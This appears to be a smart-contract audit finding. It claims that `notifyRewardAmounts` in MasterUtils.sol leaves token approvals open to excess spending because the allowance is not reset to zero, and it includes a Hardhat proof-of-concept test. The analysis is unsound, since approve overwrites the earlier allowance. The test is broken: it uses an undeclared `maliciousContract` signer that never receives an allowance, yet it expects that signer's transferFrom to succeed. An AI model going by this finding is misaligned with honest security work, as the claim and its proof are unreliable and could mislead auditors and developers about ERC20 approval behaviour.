# Lack of approval reset in `notifyRewardAmounts` function will allow excessive spending of tokens in future interactions with the same contract in `MasterUtils.sol`

### Summary

The `notifyRewardAmounts` function within the `MasterUtils` contract grants allowances for reward tokens to specific bribe contracts without first resetting the allowance to zero. This approach can result in unintended transfers where the approvals are not properly updated, as lingering allowances will allow excessive spending of tokens in future interactions with the same contract.

### Root Cause

In the `notifyRewardAmounts` function, the code grants allowances by calling `IERC20(rewards[i]).approve(bribes[i], amounts[i]);` to allocate funds to specified bribe contracts. However, since the allowance isnâ€™t reset to zero before re-approval, this will lead to unintended consequences if allowances persist beyond the intended transaction. Failure to reset the approval can allow the target contract to transfer more tokens than desired in future calls.

### Impact

The unchecked approval behavior in `notifyRewardAmounts` can allow an external actor, particularly the recipient of the approval (the `bribes` contract in this case), to transfer more tokens than intended if future interactions do not reset the allowance. This vulnerability could lead to unintended token losses if the allowance remains active beyond the immediate transaction.

### PoC

To demonstrate this vulnerability, we can create a Hardhat test that calls the `notifyRewardAmounts` function multiple times, mimicking an external contract that leverages the granted allowance repeatedly. This allows excess tokens to be spent due to the lingering approval.
```javascript
// Vulnerability PoC Test
const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("Approval Vulnerability PoC", function () {
  let masterUtils, bribe, rewardToken, operator;
  let rewardAmount = ethers.utils.parseEther("100");

  before(async function () {
    [operator, maliciousContract] = await ethers.getSigners();

    // Deploy reward token and bribe contract
    const RewardToken = await ethers.getContractFactory("MockERC20");
    rewardToken = await RewardToken.deploy("RewardToken", "RWT", 18);
    await rewardToken.deployed();

    const Bribe = await ethers.getContractFactory("MockBribe");
    bribe = await Bribe.deploy();
    await bribe.deployed();

    // Deploy the MasterUtils contract
    const MasterUtils = await ethers.getContractFactory("MasterUtils");
    masterUtils = await MasterUtils.deploy();
    await masterUtils.initialize(operator.address, operator.address, operator.address, operator.address, 100);

    // Mint rewards and approve for MasterUtils
    await rewardToken.mint(masterUtils.address, rewardAmount.mul(10));
  });

  it("Should allow unintended token transfers", async function () {
    // Set initial bribe amount limit
    await masterUtils.setBribeAmountLimit(bribe.address, rewardAmount);

    // First notify reward amounts
    await masterUtils.connect(operator).notifyRewardAmounts(
      [bribe.address],
      [rewardToken.address],
      [rewardAmount]
    );

    // Malicious contract uses the lingering approval to transfer extra tokens
    await rewardToken.connect(maliciousContract).transferFrom(masterUtils.address, maliciousContract.address, rewardAmount.div(2));

    // Check that unintended tokens were transferred
    expect(await rewardToken.balanceOf(maliciousContract.address)).to.equal(rewardAmount.div(2));
  });
});
```
